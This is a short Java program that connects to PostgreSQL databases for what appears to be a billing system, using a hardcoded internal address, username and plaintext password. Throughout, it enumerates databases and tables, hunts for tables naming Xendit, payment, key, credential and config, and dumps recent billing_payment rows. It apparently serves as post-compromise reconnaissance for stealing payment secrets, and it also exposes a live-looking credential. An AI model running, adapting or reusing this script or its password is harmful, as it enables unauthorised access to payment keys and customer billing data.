import java.sql.*;
class DF1 {
  public static void main(String[] a) throws Exception {
    Class.forName("org.postgresql.Driver");
    // Venus DB - billing system
    System.out.println("===VENUS DB===");
    try {
      Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/venus","neo","BJwx+sAC6jreaV45");
      Statement s = c.createStatement();
      ResultSet r = s.executeQuery("SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename");
      while(r.next()) System.out.println("  "+r.getString(1));
      // Search Venus for xendit/payment keys
      System.out.println("---VENUS-XENDIT-SEARCH---");
      r = s.executeQuery("SELECT column_name,table_name FROM information_schema.columns WHERE data_type IN ('character varying','text') AND table_name IN ('billing_payment','payment_point')");
      while(r.next()) System.out.println("  "+r.getString(2)+"."+r.getString(1));
      // Dump billing_payment
      System.out.println("---BILLING-PAYMENT---");
      r = s.executeQuery("SELECT * FROM billing_payment ORDER BY id DESC LIMIT 2");
      ResultSetMetaData md = r.getMetaData();
      for(int i=1;i<=md.getColumnCount();i++) System.out.print(md.getColumnName(i)+"|");
      System.out.println();
      while(r.next()) {
        for(int i=1;i<=md.getColumnCount();i++) {
          String v=r.getString(i);
          System.out.print((v!=null?v.substring(0,Math.min(100,v.length())):"null")+"|");
        }
        System.out.println();
      }
      c.close();
    } catch(Exception e) { System.out.println("VENUS FAIL: "+e.getMessage()); }

    // Neptune DB
    System.out.println("===NEPTUNE DB===");
    try {
      Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/neptune","neo","BJwx+sAC6jreaV45");
      Statement s = c.createStatement();
      ResultSet r = s.executeQuery("SELECT tablename FROM pg_tables WHERE schemaname='public' AND (tablename LIKE '%xendit%' OR tablename LIKE '%payment%' OR tablename LIKE '%key%' OR tablename LIKE '%credential%' OR tablename LIKE '%config%') ORDER BY tablename");
      while(r.next()) System.out.println("  "+r.getString(1));
      c.close();
    } catch(Exception e) { System.out.println("NEPTUNE FAIL: "+e.getMessage()); }

    // Mercury DB
    System.out.println("===MERCURY DB===");
    try {
      Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/mercury","neo","BJwx+sAC6jreaV45");
      Statement s = c.createStatement();
      ResultSet r = s.executeQuery("SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename");
      while(r.next()) System.out.println("  "+r.getString(1));
      c.close();
    } catch(Exception e) { System.out.println("MERCURY FAIL: "+e.getMessage()); }

    // List ALL databases on this server
    System.out.println("===ALL-DATABASES===");
    try {
      Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/neo","neo","BJwx+sAC6jreaV45");
      Statement s = c.createStatement();
      ResultSet r = s.executeQuery("SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY datname");
      while(r.next()) System.out.println("  "+r.getString(1));
      c.close();
    } catch(Exception e) { System.out.println("LIST DB FAIL"); }
  }
}
